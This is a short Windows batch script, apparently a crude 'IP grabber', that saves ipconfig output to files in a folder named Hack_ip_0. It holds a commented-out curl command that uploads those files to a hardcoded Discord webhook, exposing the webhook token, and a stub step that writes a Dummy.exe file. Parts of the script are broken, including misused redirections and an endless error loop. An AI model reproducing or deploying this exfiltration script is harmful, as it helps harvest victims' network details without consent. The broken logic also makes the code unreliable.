:menu
@echo off
SET /p WebHook.=" WebHook  >  "
mkdir Hack_ip_0
echo >> ipconfig > Hack_ip_0\ip.txt
ipconfig >> ip.txt
(
echo %webhook.% redy
timeout 3 > nul
goto test
)
:error
echo error
timeout 1 >nul
cls
goto error
:whenError
ipconfig >> ip.txt
goto menu
:test
for %%f in (*ip.txt) do (
 REM curl -F "file=@%%f" -H "Content-Type: multipart/form-data" https://discordapp.com/api/webhooks/1179754334548922439/xGhYVQkS9YWjFrR9ca2r3g9kMR6mgtL98EInOXerbjbh0Q2GoI47B3Qi_mWmVgINd9uc
)
goto create_exe
cls
:create_exe
cls
echo create exe ?
SET /p choix=" yes or no>  "
if %choix%== yes goto :yes
if %choix%== no goto :no
:yes
echo createing exe
timeout 3 > nul
mkdir Hack_ip_exe
cd Hack_ip_exe
echo >> ipconfig > Dummy.exe
:no
goto menu